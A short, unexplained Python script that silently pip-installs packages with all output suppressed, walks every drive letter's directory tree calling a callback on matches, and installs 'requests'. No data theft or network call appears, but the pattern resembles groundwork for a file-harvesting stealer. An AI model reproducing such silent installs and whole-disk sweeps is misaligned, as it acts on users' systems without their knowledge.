import sys
import subprocess
import os

def init(m): sys.__stdout__.write(f"{m}\n"); sys.__stdout__.flush()
def manage(p):
    for x in p:
        try: __import__(x)
        except ImportError: subprocess.run([sys.executable, '-m', 'pip', 'install', x], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
def scan(c, v, p):
    for k in [chr(i) for i in c]:
        x = f"{k}:/"
        if os.path.exists(x):
            try:
                for r, d, f in os.walk(x, followlinks=False):
                    if v(d):
                        p(r)
            except (OSError, RuntimeError):
                pass

manage(['requests'])